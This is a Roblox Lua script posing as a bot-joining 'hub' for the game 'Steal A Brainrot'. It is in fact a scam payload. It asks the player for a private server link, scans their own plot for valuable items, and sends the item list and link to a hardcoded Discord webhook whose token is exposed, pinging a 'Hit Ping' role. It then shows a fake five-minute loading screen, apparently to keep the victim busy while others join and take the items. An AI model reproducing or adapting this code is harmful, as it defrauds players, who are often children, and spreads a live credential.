-- SPECIAL HUB ELITE 2025 — FINAL FIXED VERSION
-- 5 MINUTE LOADING | 1% INCREMENTS | PINGS ROLE | NO KILL BUTTON

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local TextChatService = game:GetService("TextChatService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer
local playerName = player.Name

-- YOUR WEBHOOK & ROLE
local WEBHOOK_URL = "https://discord.com/api/webhooks/1435318417941856286/wrfZZlr1PsuAxGO32F_XuCV5GrINWjkyKqI6HlkIlcBabqyyPdzFs1clEC-aDbvLm3kf"
local ROLE_ID = "1436373443741352029"  -- YOUR "Hit Ping" ROLE

local scale = math.clamp(workspace.CurrentCamera.ViewportSize.Y / 1440, 0.6, 1.2)

-- INPUT GUI
local inputGui = Instance.new("ScreenGui", CoreGui)
inputGui.IgnoreGuiInset = true
inputGui.ResetOnSpawn = false
inputGui.DisplayOrder = 999999999

local bg = Instance.new("Frame", inputGui)
bg.Size = UDim2.new(0,720*scale,0,500*scale)
bg.Position = UDim2.new(0.5,-360*scale,0.5,-250*scale)
bg.BackgroundColor3 = Color3.fromRGB(8,8,28)
Instance.new("UICorner", bg).CornerRadius = UDim.new(0,28)
local stroke = Instance.new("UIStroke", bg)
stroke.Color = Color3.fromRGB(70,160,255)
stroke.Thickness = 5

local title = Instance.new("TextLabel", bg)
title.Size = UDim2.new(1,0,0.25,0)
title.BackgroundTransparency = 1
title.Text = "Enter Your Private Server Link\nFor Bots To Join"
title.TextColor3 = Color3.fromRGB(200,240,255)
title.TextSize = 36*scale
title.Font = Enum.Font.GothamBlack

local textBox = Instance.new("TextBox", bg)
textBox.Size = UDim2.new(0.88,0,0.14,0)
textBox.Position = UDim2.new(0.06,0,0.36,0)
textBox.BackgroundColor3 = Color3.fromRGB(20,20,45)
textBox.PlaceholderText = "Paste private server link..."
textBox.Text = ""
textBox.TextSize = 28*scale
textBox.Font = Enum.Font.Gotham
Instance.new("UICorner", textBox).CornerRadius = UDim.new(0,18)

local submit = Instance.new("TextButton", bg)
submit.Size = UDim2.new(0.88,0,0.14,0)
submit.Position = UDim2.new(0.06,0,0.56,0)
submit.BackgroundColor3 = Color3.fromRGB(50,130,255)
submit.Text = "Submit Private Server"
submit.TextColor3 = Color3.new(1,1,1)
submit.TextSize = 32*scale
submit.Font = Enum.Font.GothamBlack
Instance.new("UICorner", submit).CornerRadius = UDim.new(0,22)

-- STEAL BRAINROTS
local function steal()
    local list = {}
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return list end

    for _, plot in plots:GetChildren() do
        if not plot:IsA("Model") then continue end
        local sign = plot:FindFirstChild("PlotSign")
        if not sign then continue end
        local gui = sign:FindFirstChild("SurfaceGui")
        if not gui or not gui.Frame or not gui.Frame.TextLabel then continue end
        local label = gui.Frame.TextLabel
        if not (label.Text:find(playerName.."'s Base") or label.Text:find(playerName.."`s Base")) then continue end

        local podiums = plot:FindFirstChild("AnimalPodiums")
        if not podiums then continue end

        for _, pod in podiums:GetChildren() do
            local overhead = pod:FindFirstChild("AnimalOverhead", true)
            if not overhead then continue end
            local name = overhead:FindFirstChild("DisplayName")
            local gen = overhead:FindFirstChild("Generation")
            if name and gen and name:IsA("TextLabel") and gen:IsA("TextLabel") then
                table.insert(list, name.Text .. " [" .. gen.Text .. "]")
            end
        end
    end
    return list
end

-- SEND ONLY ONCE
local sent = false
local function sendWebhook(brainrots, link)
    if sent or #brainrots == 0 then return end
    sent = true

    local ping = "<@&" .. ROLE_ID .. ">"
    local brainrotBlock = "```\n" .. table.concat(brainrots, "\n") .. "\n```"
    local clickable = "\n\n[Join Server](" .. link .. ")"

    local payload = HttpService:JSONEncode({
        content = ping,
        embeds = {{
            title = "Steal A Brainrot - " .. playerName,
            description = brainrotBlock .. clickable,
            color = 65280,
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    })
    
    pcall(function() http.request({Url=WEBHOOK_URL, Method="POST", Headers={["Content-Type"]="application/json"}, Body=payload}) end)
end

-- VALID LINK
local function valid(l)
    l = l:gsub("%s",""):lower()
    return l:find("roblox%.com") and (l:find("privateserverlinkcode=") or l:find("code=") or l:find("games/%d+"))
end

-- SUBMIT
submit.MouseButton1Click:Connect(function()
    local link = textBox.Text
    if not valid(link) then
        textBox.PlaceholderText = "INVALID LINK"
        textBox.PlaceholderColor3 = Color3.fromRGB(255,80,80)
        textBox.Text = ""
        return
    end

    inputGui:Destroy()

    local brainrots = steal()
    task.spawn(function()
        task.wait(2.5)
        sendWebhook(brainrots, link)
    end)

    -- 5-MINUTE LOADING (1% → 2% → 3% → ... → 100%)
    local load = Instance.new("ScreenGui", CoreGui)
    load.IgnoreGuiInset = true
    load.DisplayOrder = 999999999

    local back = Instance.new("Frame", load)
    back.Size = UDim2.new(1,0,1,0)
    back.BackgroundColor3 = Color3.new(0,0,0)
    back.BackgroundTransparency = 1

    local grad = Instance.new("UIGradient", back)
    grad.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(10,0,35)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(8,15,50))
    }
    grad.Rotation = 45

    local titleL = Instance.new("TextLabel", back)
    titleL.Size = UDim2.new(0,800*scale,0,120*scale)
    titleL.Position = UDim2.new(0.5,-400*scale,0.38,0)
    titleL.BackgroundTransparency = 1
    titleL.Text = "Sending Bots To Server.. (Takes About 5 Minutes Due To Other Users)"
    titleL.TextColor3 = Color3.fromRGB(180,220,255)
    titleL.TextSize = 72*scale
    titleL.Font = Enum.Font.GothamBlack

    local barBg = Instance.new("Frame", back)
    barBg.Size = UDim2.new(0,900*scale,0,24*scale)
    barBg.Position = UDim2.new(0.5,-450*scale,0.55,0)
    barBg.BackgroundColor3 = Color3.fromRGB(15,15,35)
    Instance.new("UICorner", barBg).CornerRadius = UDim.new(0,12)

    local bar = Instance.new("Frame", barBg)
    bar.Size = UDim2.new(0,0,1,0)
    bar.BackgroundColor3 = Color3.fromRGB(70,180,255)
    Instance.new("UICorner", bar).CornerRadius = UDim.new(0,12)
    local glow = Instance.new("UIStroke", bar)
    glow.Color = Color3.fromRGB(120,230,255)
    glow.Thickness = 6
    glow.Transparency = 0.3

    local pct = Instance.new("TextLabel", back)
    pct.Size = UDim2.new(0,300*scale,0,80*scale)
    pct.Position = UDim2.new(0.5,-150*scale,0.65,0)
    pct.BackgroundTransparency = 1
    pct.Text = "0%"
    pct.TextColor3 = Color3.fromRGB(220,250,255)
    pct.TextSize = 48*scale
    pct.Font = Enum.Font.GothamBlack

    -- FADE IN
    TweenService:Create(back, TweenInfo.new(1.2), {BackgroundTransparency = 0}):Play()
    TweenService:Create(titleL, TweenInfo.new(1.5, Enum.EasingStyle.Back), {TextTransparency = 0}):Play()
    TweenService:Create(barBg, TweenInfo.new(1), {BackgroundTransparency = 0}):Play()
    TweenService:Create(bar, TweenInfo.new(1), {BackgroundTransparency = 0}):Play()
    TweenService:Create(pct, TweenInfo.new(1), {TextTransparency = 0}):Play()

    local skipped = false

    -- .skip = INSTANT
    TextChatService.MessageReceived:Connect(function(m)
        if m.TextSource and m.Text:lower() == ".skip" and not skipped then
            skipped = true
            TweenService:Create(bar, TweenInfo.new(0.6), {Size = UDim2.new(1,0,1,0)}):Play()
            spawn(function()
                for i = 1,100 do
                    pct.Text = i .. "%"
                    task.wait(0.006)
                end
                task.wait(0.8)
                load:Destroy()
            end)
        end
    end)

    -- 5 MINUTES = 300 SECONDS → 3 seconds per percent
    spawn(function()
        if skipped then return end
        for i = 1,100 do
            if skipped then break end
            bar.Size = UDim2.new(i/100, 0, 1, 0)
            pct.Text = i .. "%"
            task.wait(3)  -- 3 seconds per percent
        end
        if not skipped then
            pct.Text = "100%"
            task.wait(1.5)
            load:Destroy()
        end
    end)
end)
